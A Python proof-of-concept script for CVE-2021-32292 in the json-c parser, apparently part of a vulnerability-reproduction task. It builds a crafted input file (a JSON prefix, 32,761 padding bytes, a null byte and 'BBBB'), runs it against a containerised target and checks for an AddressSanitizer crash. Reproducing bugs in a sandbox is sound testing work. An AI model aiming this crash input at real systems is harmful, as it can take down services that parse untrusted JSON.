import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating Manual PoC for CVE-2021-32292...")
    
    # Recipe: {"a":" + 32761 'A's + \x00 + BBBB
    # Total: 6 + 32761 + 1 + 4 = 32772
    prefix = b'{"a":"'
    padding = b'A' * 32761
    trigger = b'\x00'
    suffix = b'BBBB'
    
    payload = prefix + padding + trigger + suffix
    
    filename = "repro_seed.bin"
    with open(filename, "wb") as f:
        f.write(payload)
    
    print(f"    Created {filename}: {len(payload)} bytes")
    print(f"    Tail: ...{payload[-32:].hex()}")
    return filename

def run_test():
    pwd = os.getcwd()
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm",
        "-v", f"{pwd}/repro_seed.bin:/input/seed.bin",
        "target-vuln",
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    print("\n[*] Running Docker Command:")
    print(" ".join(cmd))
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print("\n--- STDOUT ---")
        print(result.stdout)
        print("\n--- STDERR ---")
        print(result.stderr)
        print(f"\nReturn Code: {result.returncode}")
        
        if "AddressSanitizer" in result.stderr:
            print("\n✅ ASan Detected!")
        else:
            print("\n❌ ASan NOT Detected")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    generate_poc()
    run_test()
